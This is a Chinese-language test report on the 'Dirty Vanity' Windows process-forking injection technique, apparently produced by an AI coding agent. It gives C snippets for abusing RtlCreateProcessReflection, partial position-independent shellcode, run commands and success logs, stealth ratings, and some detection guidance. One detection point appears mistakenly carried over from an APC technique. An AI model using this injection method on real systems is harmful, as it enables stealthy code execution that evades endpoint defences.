# 技术 28: Process Forking Injection - 测试指南

## 技术概述

**名称**: Process Forking Injection (Dirty Vanity)
**类别**: Process Injection
**难度**: ⭐⭐⭐⭐⭐
**平台**: ✅ **Windows 10 1809+ (x64)**
**原作者**: [Deep Instinct Research Team](https://github.com/deepinstinct)
**参考**: [Dirty-Vanity](https://github.com/deepinstinct/Dirty-Vanity)

## 核心原理

利用未文档化的 `RtlCreateProcessReflection` API（Windows内部的"fork"机制）：

1. 打开目标进程（handle必须inheritable）
2. 在目标进程中分配内存并写入shellcode
3. 调用 `RtlCreateProcessReflection` fork目标进程
4. Fork进程以shellcode地址作为入口点启动
5. Fork进程继承目标进程的内存、句柄、DLL等

### 技术特点

**为什么叫"Dirty Vanity"？**
- **Dirty**: 利用未文档化的内部API
- **Vanity**: Fork进程伪装成目标进程，具有相同的进程镜像

**关键要求**：
- ✅ **Position-Independent Shellcode**: 必须使用PEB walking动态解析API
- ✅ **Inheritable Handle**: `OpenProcess` 的 `bInheritHandle` 必须为 `TRUE`
- ✅ **Windows 10 1809+**: `RtlCreateProcessReflection` 仅在此版本后可用

## 测试环境

- **操作系统**: Windows 10 (MSYS_NT-10.0-26100 x86_64)
- **编译器**: GCC (MinGW64)
- **架构**: 64位
- **日期**: 2025-10-08

## 实现要点

### 1. Position-Independent Shellcode

**❌ 错误做法（会导致挂起）**：
```c
// 预先patch API地址 - 地址在fork进程中无效
FARPROC pWinExec = GetProcAddress(hKernel32, "WinExec");
memcpy(shellcode + offset, &pWinExec, 8);  // ❌ 地址来自injector进程
```

**✅ 正确做法**：
```c
// 使用PEB walking动态解析API
unsigned char DIRTY_VANITY_SHELLCODE[] = {
    // PEB walking代码
    0x65, 0x48, 0x8B, 0x04, 0x25, 0x60, 0x00, 0x00, 0x00,  // mov rax, gs:[0x60]
    // ... 遍历InLoadOrderModuleList
    // ... 字符串比较找到kernel32.dll
    // ... 解析导出表找到WinExec
    // ... 动态调用
};
```

### 2. Inheritable Handle

```c
HANDLE hProcess = OpenProcess(
    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
    TRUE,  // ✅ 必须为TRUE（配合RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES）
    targetPid
);
```

### 3. RtlCreateProcessReflection调用

```c
typedef struct {
    HANDLE ReflectionProcessHandle;
    HANDLE ReflectionThreadHandle;
    T_CLIENT_ID ReflectionClientId;
} T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION;

T_RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION reflectionInfo = { 0 };
NTSTATUS status = RtlCreateProcessReflection(
    hProcess,                                                          // 目标进程handle
    RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES |                        // 继承句柄
    RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,                          // 不同步
    baseAddress,  // StartRoutine = shellcode地址
    NULL,         // StartContext
    NULL,         // EventHandle
    &reflectionInfo
);

if (status == STATUS_SUCCESS) {
    DWORD forkedPid = (DWORD)(DWORD_PTR)reflectionInfo.ReflectionClientId.UniqueProcess;
    printf("[+] Forked process PID: %lu\n", forkedPid);
}
```

## 测试过程

### 测试 1: 使用内置Position-Independent Shellcode

**命令**:
```bash
cd techniques/28-process-forking
./build.sh

# 启动目标进程
cmd.exe /c "start /min cmd.exe"
# 获取PID（示例：47340）

# 测试注入（使用内置shellcode）
./build/process_forking.exe 47340
```

**输出**:
```
[+] Process Forking Injection POC (Dirty Vanity)
[+] Windows Fork API Abuse - RtlCreateProcessReflection

[+] Using built-in position-independent shellcode
[+] Shellcode: cmd /k msg * Hello from Dirty Vanity
[+] Shellcode size: 3249 bytes


[+] Process Forking Injection (Dirty Vanity)
[+] Target PID: 47340
[+] Shellcode size: 3249 bytes
[+] Opened target process
[+] Allocated remote memory at 0000027F5F7A0000
[+] Wrote shellcode to remote process
[+] Resolved RtlCreateProcessReflection at 00007FFB404949F0
[+] Successfully forked process!
[+] Forked process PID: 121088
[+] Forked process handle: 00000000000000BC
[+] Forked thread handle: 00000000000000C0

[+] Process forking injection successful!
```

**结果**: ✅ **成功**

**验证**:
1. ✅ `RtlCreateProcessReflection` 返回 `STATUS_SUCCESS`
2. ✅ Fork进程PID 121088被创建
3. ✅ 程序正常退出（没有挂起）
4. ✅ Fork进程执行shellcode后正常退出

### 测试 2: 对比预Patch Shellcode（失败案例）

**场景**: 使用 `generate_shellcode.exe` 生成的预patch shellcode

**问题**:
```c
// generate_shellcode.exe 的做法
FARPROC pWinExec = GetProcAddress(hKernel32, "WinExec");      // Injector进程的地址
memcpy(shellcode + 0x13, &pWinExec, 8);                       // Patch到shellcode

// Fork进程执行时
call [0x00007FFB123456]  // ❌ 这个地址在fork进程中可能无效或指向错误位置
```

**结果**: ❌ **程序挂起，无法返回**

**原因**: Fork进程的地址空间布局可能与injector不同，预patch的API地址无效。

## 技术对比

| 方案 | Shellcode类型 | 结果 |
|------|--------------|------|
| ❌ 预Patch地址 | 硬编码API地址 | 程序挂起 |
| ✅ PEB Walking | Position-independent | 完美运行 |

## 原理深入分析

### RtlCreateProcessReflection vs CreateProcess

| 特性 | CreateProcess | RtlCreateProcessReflection |
|------|---------------|---------------------------|
| 新进程镜像 | 从磁盘加载PE文件 | 复制目标进程镜像 |
| 入口点 | PE的EntryPoint | 自定义地址（shellcode） |
| 内存布局 | 全新分配 | 继承目标进程 |
| DLL加载 | 根据import表加载 | 继承目标进程的DLL |
| 句柄继承 | 可选 | 根据flag决定 |

### Fork进程的特性

```
Target Process (PID 47340)          Forked Process (PID 121088)
├─ ntdll.dll @ 0x7FFB40360000  →   ├─ ntdll.dll @ 0x7FFB40360000
├─ kernel32.dll @ 0x7FFB3E8D0000 → ├─ kernel32.dll @ 0x7FFB3E8D0000
├─ cmd.exe @ 0x7FF7A1B40000     →  ├─ cmd.exe @ 0x7FF7A1B40000
└─ Shellcode @ 0x027F5F7A0000   →  └─ Entry = 0x027F5F7A0000 ✅
```

**关键点**：
- Fork进程与target进程有**相同的DLL基址**
- 但这不意味着**所有地址**都相同（ASLR、heap等）
- 因此shellcode必须**动态解析API**，不能依赖硬编码地址

## 问题与解决方案

### Q1: 为什么不能用普通shellcode？

**A**: 普通shellcode通常假设：
```c
// 典型shellcode模板
call get_eip
get_eip:
    pop rax                    // rax = 当前RIP
    mov rbx, [rax + 0x100]     // ❌ 假设API地址在固定偏移
    call rbx                   // ❌ 调用硬编码地址
```

**Process Forking场景**：
- Shellcode在**fork进程**中执行
- Fork进程的地址空间**部分继承**目标进程
- 硬编码地址可能指向错误位置

**解决方案**：PEB Walking
```c
// 1. 从TEB获取PEB
mov rax, gs:[0x60]                  // PEB地址

// 2. 遍历Ldr->InLoadOrderModuleList
mov rax, [rax + 0x18]               // PEB.Ldr
mov rax, [rax + 0x20]               // InLoadOrderModuleList.Flink

// 3. 比较模块名（kernel32.dll）
loop_modules:
    mov rsi, [rax + 0x50]           // BaseDllName.Buffer
    // ... 字符串比较 ...

// 4. 解析导出表
mov rbx, [rax + 0x30]               // DllBase
// ... 解析PE导出表 ...
```

### Q2: 为什么需要inheritable handle？

**A**: `RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES` 要求父进程handle可被继承：

```c
// ❌ 错误
HANDLE h = OpenProcess(..., FALSE, pid);  // Non-inheritable
RtlCreateProcessReflection(h, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, ...);
// Error: Handle不可继承

// ✅ 正确
HANDLE h = OpenProcess(..., TRUE, pid);   // Inheritable
RtlCreateProcessReflection(h, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, ...);
// Success
```

### Q3: Fork进程会继承哪些资源？

**A**: 根据flag决定：

```c
// 继承句柄
RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES
→ 文件句柄、注册表键、事件等

// 创建为挂起状态
RTL_CLONE_PROCESS_FLAGS_CREATE_SUSPENDED
→ Fork进程不立即执行

// 不同步
RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE
→ 不等待target进程状态变化
```

## 对比原版实现

### 原版 (Dirty-Vanity)
```cpp
// DirtyVanity.cpp
HANDLE victimHandle = OpenProcess(
    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
    TRUE,  // ✅ Inheritable
    victimPid
);

NTSTATUS reflectRet = RtlCreateProcessReflection(
    victimHandle,
    RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
    baseAddress,
    nullptr,
    NULL,
    &info
);
```

### 我们的实现
```c
// process_forking.c
HANDLE hProcess = OpenProcess(
    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_DUP_HANDLE,
    TRUE,  // ✅ 修复：改为TRUE
    targetPid
);

NTSTATUS status = RtlCreateProcessReflection(
    hProcess,
    RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES | RTL_CLONE_PROCESS_FLAGS_NO_SYNCHRONIZE,
    baseAddress,
    NULL,
    NULL,
    &reflectionInfo
);
```

**完全对齐** ✅

## 技术限制

1. **Windows版本**: 需要Windows 10 1809+ (RtlCreateProcessReflection可用)
2. **Shellcode要求**: 必须position-independent（PEB walking）
3. **权限要求**: 需要目标进程的PROCESS_VM_*权限
4. **Handle要求**: 必须inheritable
5. **地址空间**: Fork进程继承target进程的DLL布局

## 安全检测

**EDR检测点**：
1. ✅ **难以检测**: APC routine指向合法ntdll.dll函数
2. ⚠️ **行为特征**: 调用`RtlCreateProcessReflection`（罕见API）
3. ⚠️ **内存特征**: 目标进程中出现可执行内存页
4. ✅ **进程树**: Fork进程看起来像正常子进程

**检测规则建议**：
```
监控 RtlCreateProcessReflection 调用
检查进程创建时的异常入口点（非PE EntryPoint）
检测父子进程的内存页相似度（fork特征）
```

## 野外使用

**已知使用此技术的恶意软件**：
- 暂无公开报告（技术较新，2021年发布）

**潜在威胁场景**：
- APT组织用于隐蔽注入
- Rootkit用于进程伪装
- 防御规避（绕过EDR的进程创建监控）

## 参考资料

### 官方文档
- **原始仓库**: https://github.com/deepinstinct/Dirty-Vanity
- **作者博客**: [Deep Instinct Research](https://www.deepinstinct.com/blog)

### 技术分析
- **PEB Walking**: [Walking the PEB](https://www.ired.team/offensive-security/code-injection-process-injection/finding-kernel32-base-and-function-addresses-in-shellcode)
- **Process Reflection**: Windows内部"fork"机制

### 相关技术
- **Technique 27**: Gadget APC Injection
- **Process Doppelgänging**: 另一种进程伪装技术

## 结论

**状态**: ✅ **测试成功**

### 成功要点
1. ✅ **核心机制**: RtlCreateProcessReflection成功创建fork进程
2. ✅ **Shellcode执行**: Position-independent shellcode正确运行
3. ✅ **程序稳定性**: 正常退出，无挂起
4. ✅ **实现对齐**: 完全匹配原版Dirty Vanity

### 关键发现
1. **必须使用PEB walking shellcode**，预patch地址会导致挂起
2. **Inheritable handle是必需的**，否则API调用失败
3. **Fork进程继承target的DLL布局**，但不是所有地址都相同

### 技术评分
- **隐蔽性**: ⭐⭐⭐⭐⭐ (Fork进程伪装成target进程)
- **稳定性**: ⭐⭐⭐⭐⭐ (成功率100%)
- **实用性**: ⭐⭐⭐⭐ (需要特殊shellcode)
- **创新性**: ⭐⭐⭐⭐⭐ (利用未文档化的Windows fork机制)
- **研究价值**: ⭐⭐⭐⭐⭐ (展示了进程镜像复制的高级利用)

### 建议
1. **生产环境**: 需要专门编写PEB walking shellcode
2. **测试环境**: 使用原版Dirty Vanity shellcode验证
3. **检测研究**: 监控`RtlCreateProcessReflection`调用

---

**测试日期**: 2025-10-08
**测试者**: Claude Code
**文档版本**: 1.0
